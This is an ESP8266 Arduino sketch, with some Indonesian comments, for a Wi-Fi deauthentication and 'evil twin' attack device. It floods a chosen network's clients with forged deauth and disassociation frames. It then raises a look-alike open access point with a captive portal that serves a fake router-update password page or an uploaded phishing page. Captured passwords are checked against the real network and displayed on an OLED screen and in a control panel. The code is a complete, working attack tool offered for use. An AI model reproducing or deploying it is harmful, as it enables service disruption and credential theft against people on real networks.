#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

Adafruit_SSD1306 display(
  SCREEN_WIDTH,
  SCREEN_HEIGHT,
  &Wire,
  OLED_RESET
);

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  uint8_t encryption;
  int32_t rssi;
} _Network;

enum DisplayMode {
  MODE_SCAN,
  MODE_DEAUTH,
  MODE_DEAUTH_ET,
  MODE_RESULT
};
DisplayMode displayMode = MODE_SCAN;

_Network _networks[16];
_Network _selectedNetwork;

int networkCount = 0;
int displayNetworkIndex = 0;

bool hotspot_active = false;
bool deauthing_active = false;
bool fullListShown = false;

unsigned long lastNetworkDisplay = 0;
unsigned long lastWifiScan = 0;
unsigned long lastProcessAnimation = 0;
unsigned long lastProcessRSSI = 0;

const unsigned long NETWORK_DISPLAY_INTERVAL = 2000;
const unsigned long WIFI_SCAN_INTERVAL = 20000;

int processDots = 0;
int currentProcessRSSI = -100;

String resultSSID = "";
String maskedResult = "********";
String _tryPassword = "";
String _tryUsername = "";

IPAddress apIP(10, 10, 10, 1);
IPAddress gatewayIP(10, 10, 10, 1);
IPAddress subnetMask(255, 255, 255, 0);

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void updateProcessDisplay() {
  if (displayMode != MODE_DEAUTH &&
      displayMode != MODE_DEAUTH_ET) {
    return;
  }

  unsigned long currentMillis = millis();

  if (currentMillis - lastProcessAnimation >= 350) {
    processDots++;

    if (processDots > 4) {
      processDots = 0;
    }

    lastProcessAnimation = currentMillis;
  }

  if (currentMillis - lastProcessRSSI >= 3000) {
    currentProcessRSSI = WiFi.RSSI();

    if (_selectedNetwork.ssid != "") {
      for (int i = 0; i < networkCount; i++) {
        if (_networks[i].ssid == _selectedNetwork.ssid) {
          currentProcessRSSI = _networks[i].rssi;
          break;
        }
      }
    }

    lastProcessRSSI = currentMillis;
  }

  String wifiName = _selectedNetwork.ssid;

  if (wifiName.length() == 0) {
    wifiName = "[No WiFi selected]";
  }

  if (wifiName.length() > 20) {
    wifiName = wifiName.substring(0, 20);
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  display.setCursor(0, 3);

  if (displayMode == MODE_DEAUTH_ET) {
    display.print("Process");
  } else {
    display.print("Deauth");
  }

  for (int i = 0; i < processDots; i++) {
    display.print(" .");
  }

  display.drawLine(0, 16, 127, 16, SSD1306_WHITE);

  if (displayMode == MODE_DEAUTH_ET) {
    display.setCursor(0, 20);
    display.println("Deauth + ET");

    display.setCursor(0, 32);
    display.println(wifiName);
  } else {
    display.setCursor(0, 24);
    display.println(wifiName);
  }

  display.setCursor(0, 46);
  display.print("RSSI ");
  display.print(currentProcessRSSI);
  display.print(" dBm");

  int signalPercent = map(
    currentProcessRSSI,
    -100,
    -40,
    0,
    100
  );

  signalPercent = constrain(signalPercent, 0, 100);

  display.drawRect(0, 55, 100, 8, SSD1306_WHITE);

  int barWidth = map(
    signalPercent,
    0,
    100,
    0,
    96
  );

  if (barWidth > 0) {
    display.fillRect(
      2,
      57,
      barWidth,
      4,
      SSD1306_WHITE
    );
  }

  display.display();
}

void displayStoredResult() {
  String wifiName = resultSSID;

  if (wifiName.length() == 0) {
    wifiName = "[Unknown WiFi]";
  }

  if (wifiName.length() > 20) {
    wifiName = wifiName.substring(0, 20);
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // Menampilkan Nama WiFi
  display.setCursor(0, 10);
  display.println(wifiName);

  // Menampilkan Username & Password yang didapat
  display.setCursor(0, 26);
  if (_tryUsername != "") {
    display.print("U: ");
    display.println(_tryUsername);
    display.setCursor(0, 36);
    display.print("P: ");
    if (_tryPassword != "") {
      display.println(_tryPassword);
    } else {
      display.println(maskedResult);
    }
  } else {
    if (_tryPassword != "") {
      display.println(_tryPassword);
    } else {
      display.println(maskedResult);
    }
  }

  // Menampilkan Bar RSSI
  int signalPercent = map(
    currentProcessRSSI,
    -100,
    -40,
    0,
    100
  );

  signalPercent = constrain(signalPercent, 0, 100);

  display.drawRect(0, 53, 100, 9, SSD1306_WHITE);

  int barWidth = map(
    signalPercent,
    0,
    100,
    0,
    96
  );

  if (barWidth > 0) {
    display.fillRect(
      2,
      55,
      barWidth,
      5,
      SSD1306_WHITE
    );
  }

  display.setCursor(104, 54);
  display.print(signalPercent);
  display.print("%");

  display.display();
}
void updateDisplayMode() {
  if (displayMode == MODE_RESULT) {
    return;
  }

  if (deauthing_active && hotspot_active) {
    displayMode = MODE_DEAUTH_ET;
  } else if (deauthing_active) {
    displayMode = MODE_DEAUTH;
  } else {
    displayMode = MODE_SCAN;
  }
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";

String encryptionName(uint8_t encryption) {
  switch (encryption) {
    case ENC_TYPE_NONE:
      return "OPEN";

    case ENC_TYPE_WEP:
      return "WEP";

    case ENC_TYPE_TKIP:
      return "WPA";

    case ENC_TYPE_CCMP:
      return "WPA2";

    case ENC_TYPE_AUTO:
      return "WPA/WPA2";

    default:
      return "UNKNOWN";
  }
}

void bootAnimation() {
  for (int dots = 0; dots <= 4; dots++) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);

    display.setCursor(20, 28);
    display.print("Starting");

    for (int i = 0; i < dots; i++) {
      display.print(" .");
    }

    display.display();
    delay(350);
  }
}

void scanningAnimation() {
  for (int dots = 0; dots <= 4; dots++) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);

    display.setCursor(15, 28);
    display.print("Scanning");

    for (int i = 0; i < dots; i++) {
      display.print(" .");
    }

    display.display();
    delay(350);
  }
}

void setup() {
  Serial.begin(115200);

  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
  }


  Wire.begin(D2, D1);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("OLED gagal");

    while (true) {
      delay(1000);
    }
  }

  bootAnimation();

  WiFi.mode(WIFI_AP_STA);

  WiFi.softAPConfig(apIP, gatewayIP, subnetMask);

  WiFi.softAP("D05SIe94n9ER", "misuminitt");
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/upload", HTTP_POST, []() {
    webServer.send(200, "text/plain", "");
  }, handleUpload);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  tampilkanStatus(
    "Control AP aktif",
    "IP : " + apIP.toString()
  );

  delay(800);

  performScan();
  displayCurrentNetwork();
  lastNetworkDisplay = millis();
}

void performScan() {
  scanningAnimation();

  WiFi.scanDelete();

  int n = WiFi.scanNetworks();

  clearArray();

  networkCount = 0;
  displayNetworkIndex = 0;

  if (n <= 0) {
    tampilkanStatus(
      "Scan selesai",
      "Tidak ada WiFi"
    );

    lastWifiScan = millis();
    return;
  }

  networkCount = min(n, 16);

  for (int i = 0; i < networkCount; i++) {
    _networks[i].ssid = WiFi.SSID(i);
    _networks[i].ch = WiFi.channel(i);
    _networks[i].encryption = WiFi.encryptionType(i);
    _networks[i].rssi = WiFi.RSSI(i);

    const uint8_t* currentBssid = WiFi.BSSID(i);

    for (int j = 0; j < 6; j++) {
      _networks[i].bssid[j] = currentBssid[j];
    }
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  display.setCursor(0, 25);
  display.println("Scan selesai");

  display.setCursor(0, 35);
  display.print(networkCount);
  display.print(" WiFi ditemukan");

  display.display();

  delay(1000);

  lastWifiScan = millis();
  lastNetworkDisplay = 0;
  fullListShown = false;
}

void displayCurrentNetwork() {
  if (networkCount <= 0) {
    tampilkanStatus("WiFi Scanner", "Tidak ada jaringan");
    return;
  }

  if (displayNetworkIndex >= networkCount) {
    displayNetworkIndex = 0;
  }

  _Network& network = _networks[displayNetworkIndex];

  String wifiName = network.ssid;

  if (wifiName.length() == 0) {
    wifiName = "[Hidden WiFi]";
  }

  if (wifiName.length() > 20) {
    wifiName = wifiName.substring(0, 20);
  }

  String security = encryptionName(network.encryption);

  int signalPercent = map(network.rssi, -100, -40, 0, 100);
  signalPercent = constrain(signalPercent, 0, 100);

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // Header
  display.setCursor(0, 3);
  display.print("SCAN ");
  display.print(displayNetworkIndex + 1);
  display.print("/");
  display.println(networkCount);

  display.drawLine(0, 16, 127, 16, SSD1306_WHITE);

  // Nama Wi-Fi
  display.setCursor(0, 20);
  display.println(wifiName);

  // Keamanan dan channel
  display.setCursor(0, 32);
  display.print(security);

  display.setCursor(72, 32);
  display.print("CH");

  if (network.ch < 10) {
    display.print("0");
  }

  display.print(network.ch);

  // RSSI
  display.setCursor(0, 44);
  display.print("RSSI ");
  display.print(network.rssi);
  display.print(" dBm");

  // Kotak indikator sinyal
  display.drawRect(0, 54, 100, 9, SSD1306_WHITE);

  int barWidth = map(signalPercent, 0, 100, 0, 96);

  if (barWidth > 0) {
    display.fillRect(
      2,
      56,
      barWidth,
      5,
      SSD1306_WHITE
    );
  }

  // Persentase sinyal
  display.setCursor(104, 55);
  display.print(signalPercent);
  display.print("%");

  display.display();
}

void tampilkanStatus(const String& baris1, const String& baris2) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(baris1);
  display.println(baris2);
  display.display();
}




void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(apIP, gatewayIP, subnetMask);
    WiFi.softAP("D05SIe94n9ER", "misuminitt");
    dnsServer.start(DNS_PORT, "*", apIP);
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    
    resultSSID = _selectedNetwork.ssid;
    maskedResult = "********";
    currentProcessRSSI = _selectedNetwork.rssi;
    deauthing_active = false;
    hotspot_active = false;
    displayMode = MODE_RESULT;
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>"
                   "body { background-color: #121212; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }"
                   ".content { max-width: 600px; margin: auto; background-color: #1e1e1e; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }"
                   "h2, h3 { color: #ffffff; text-align: center; }"
                   "table { width: 100%; border-collapse: collapse; margin-top: 15px; background-color: #2c2c2c; border-radius: 5px; overflow: hidden; }"
                   "th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #444; }"
                   "th { background-color: #333; color: #fff; text-transform: uppercase; font-size: 0.9em; }"
                   "tr:hover { background-color: #383838; }"
                   "button, input[type='submit'], input[type='file']::file-selector-button { background-color: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; transition: background-color 0.3s ease; font-weight: bold; font-size: 0.9em; }"
                   "button:hover, input[type='submit']:hover, input[type='file']::file-selector-button:hover { background-color: #0056b3; }"
                   "button:disabled { background-color: #555; color: #888; cursor: not-allowed; }"
                   ".controls { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }"
                   ".upload-section { margin-top: 30px; padding-top: 20px; border-top: 1px solid #444; text-align: center; }"
                   "input[type='file'] { color: #ccc; margin-bottom: 15px; }"
                   ".selected-btn { background-color: #28a745 !important; }"
                   ".selected-btn:hover { background-color: #218838 !important; }"
                   "</style>"
                   "</head><body><div class='content'><h2>WiFi Control Panel</h2>"
                   "<div class='controls'><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button {disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block;' method='post' action='/?hotspot={hotspot}'>"
                   "<button {disabled}>{hotspot_button}</button></form></div>"
                   "<table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Action</th></tr>";


void handleUpload() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    Serial.printf("Upload: %s\n", upload.filename.c_str());
    if (LittleFS.exists("/login.html")) {
      LittleFS.remove("/login.html");
    }
    File f = LittleFS.open("/login.html", "w");
    if (f) {
      f.close();
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    File f = LittleFS.open("/login.html", "a");
    if (f) {
      f.write(upload.buf, upload.currentSize);
      f.close();
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    Serial.printf("Upload Size: %u\n", upload.totalSize);
    webServer.send(200, "text/html", "<html><body><h3>File Uploaded Successfully</h3><a href='/admin'>Go Back</a></body></html>");
  }
}

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP, gatewayIP, subnetMask);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP, gatewayIP, subnetMask);
      WiFi.softAP("D05SIe94n9ER", "misuminitt");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button class='selected-btn'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

  
  _html += "<div class='upload-section'><h3>Upload Custom Login HTML</h3>";
  _html += "<form method='POST' action='/upload' enctype='multipart/form-data'>";
  _html += "<input type='file' name='upload' accept='.html'><br>";
  _html += "<input type='submit' value='Upload'>";
  _html += "</form></div>";

  if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.hasArg("username")) {
        _tryUsername = webServer.arg("username");
      } else {
        _tryUsername = "";
      }
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    } else {
            if (LittleFS.exists("/login.html")) {
        File f = LittleFS.open("/login.html", "r");
        if (f) {
          String customHtml = f.readString();
          f.close();
          customHtml.replace("{ssid}", _selectedNetwork.ssid);
          webServer.send(200, "text/html", customHtml);
          return;
        }
      }
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP, gatewayIP, subnetMask);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP, gatewayIP, subnetMask);
      WiFi.softAP("D05SIe94n9ER", "misuminitt");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button class='selected-btn'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }


  _html += "<div class='upload-section'><h3>Upload Custom Login HTML</h3>";
  _html += "<form method='POST' action='/upload' enctype='multipart/form-data'>";
  _html += "<input type='file' name='upload' accept='.html'><br>";
  _html += "<input type='submit' value='Upload'>";
  _html += "</form></div>";

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }
  updateDisplayMode();

  if (displayMode == MODE_DEAUTH ||
      displayMode == MODE_DEAUTH_ET) {
    updateProcessDisplay();
  } else if (displayMode == MODE_RESULT) {
    displayStoredResult();
  } else {

    if (millis() - lastNetworkDisplay >= NETWORK_DISPLAY_INTERVAL) {
      displayCurrentNetwork();
  
      displayNetworkIndex++;
  
      if (displayNetworkIndex >= networkCount) {
        displayNetworkIndex = 0;
        fullListShown = true;
      }
  
      lastNetworkDisplay = millis();
    }
  
    if (
      fullListShown &&
      millis() - lastWifiScan >= WIFI_SCAN_INTERVAL
    ) {
      performScan();
      displayCurrentNetwork();
  
      displayNetworkIndex = 1;
  
      if (displayNetworkIndex >= networkCount) {
        displayNetworkIndex = 0;
      }
  
      lastNetworkDisplay = millis();
      fullListShown = false;
    }
  
    if (millis() - wifinow >= 2000) {
      if (WiFi.status() != WL_CONNECTED) {
        Serial.println("BAD");
      } else {
        Serial.println("GOOD");
      }
      wifinow = millis();
   }
  }
}
